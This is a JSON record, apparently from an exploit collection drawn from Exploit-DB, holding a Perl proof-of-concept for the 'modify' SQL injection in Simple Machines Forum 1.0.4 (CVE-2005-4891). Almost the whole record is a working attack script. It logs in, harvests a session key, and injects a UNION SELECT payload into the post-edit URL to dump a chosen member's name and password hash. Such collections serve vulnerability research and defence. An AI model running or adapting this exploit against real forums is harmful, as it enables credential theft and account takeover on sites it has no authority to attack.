{
  "id": "1057",
  "title": "Simple Machines Forum (SMF) 1.0.4 - &#039;modify&#039; SQL Injection",
  "cve": "CVE-2005-4891",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl -w\r\n################################################################################\r\n# SMF Modify SQL Injection // All Versions // By James http://www.gulftech.org #\r\n################################################################################\r\n# Simple proof of concept for the modify post SQL Injection issue I discovered #\r\n# in Simple Machine Forums. Supply this script with your username password and #\r\n# the complete url to a post you made, and have permission to edit. 06/19/2005 #\r\n################################################################################\r\n\r\nuse LWP::UserAgent;\r\n\r\nif ( !$ARGV[3] ) \r\n{\r\n\tprint \"Usage: smf.pl user pass target_uid modify_url\\n\";\r\n\texit;\r\n}\r\n\r\nprint \"###################################################\\n\";\r\nprint \"# Simple Machine Forums Modify Post SQL Injection #\\n\";\r\nprint \"###################################################\\n\";\r\n\r\nmy $user = $ARGV[0]; # your username\r\nmy $pass = $ARGV[1]; # your password\r\nmy $grab = $ARGV[2]; # the id of the target account\r\nmy $post = $ARGV[3]; # the entire url to modify a post you made\r\nmy $dump = '%20UNION%20SELECT%20memberName,0,passwd,0,0%20FROM%20smf_members%20WHERE%20ID_MEMBER=' . $grab . '/*';\r\n   $post =~ s/msg=([0-9]{1,10})/msg=$1$dump/;\r\nmy $path = ( $post =~ /^(.*)\\/index\\.php/) ? $1: die(\"[!] The post url you entered seems invalid!\\n\");\r\n\r\nmy $ua = new LWP::UserAgent;\r\n   $ua->agent(\"SMF Hash Grabber v1.0\" . $ua->agent);\r\n\r\n$ua->cookie_jar({});\r\n\r\nprint \"[*] Trying $path ...\\n\";\r\n\r\nmy $req = new HTTP::Request POST => $path . \"/index.php?action=login2\";\r\n   $req->content_type('application/x-www-form-urlencoded');\r\n   $req->content('user=' . $user . '&passwrd=' . $pass . '&cookielength=-1');\r\nmy $res = $ua->request($req); \r\n\r\nprint \"[*] Logging In ...\\n\";\r\n\r\n# When a correct login is made, a redirect is issued, and no \r\n# text/html is sent to the browser really. We put 1024 to be\r\n# safe. This part can be altered in case of modded installs!\r\nif ( length($res->content) < 1024 )\r\n{\r\n\tprint \"[+] Successfully logged in as $user \\n\";\r\n\tmy $sid = $ua->get($path . '/index.php?action=profile;sa=account');\t\r\n\r\n\t# We get our current session id to be used\r\n\tprint \"[*] Trying To Get Valid Sesc ID \\n\";\r\n\tif ( $sid->content =~ /sesc=([a-f0-9]{32})/ )\r\n\t{\r\n\t\t# Replace the old session parameter with the\r\n\t\t# new one so we do not get an access denied!\r\n\t\tmy $sesc = $1;\r\n\t\t   $post =~ s/sesc=([a-f0-9]{32})/sesc=$sesc/;\r\n\r\n\t\tprint \"[+] Valid Sesc Id : $sesc\\n\";\r\n\t\tprint \"[*] Trying to get password hash ...\\n\";\r\n\r\n\t\tmy $pwn = $ua->get($post);\t\r\n\t\tif ( $pwn->content =~ />([a-z0-9]{32})<\\//i )\r\n\t\t{\r\n\t\t\tprint \"[+] Got the password hash!\\n\";\r\n\t\t\tprint \"[+] Password Hash : $1\\n\";\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tprint \"[!] Exploit Failed! Try manually verifying the vulnerability \\n\";\r\n\t\t}\r\n\t}\r\n\telse\r\n\t{\r\n\t\tprint '[!] Unable to obtain a valid sesc key!!';\r\n\t\texit;\r\n\t}\r\n}\r\nelse\r\n{\r\n\tprint '[!] There seemed to be a problem logging you in!';\r\n\texit;\r\n}\r\n\r\n# milw0rm.com [2005-06-21]",
  "url": "https://www.exploit-db.com/exploits/1057"
}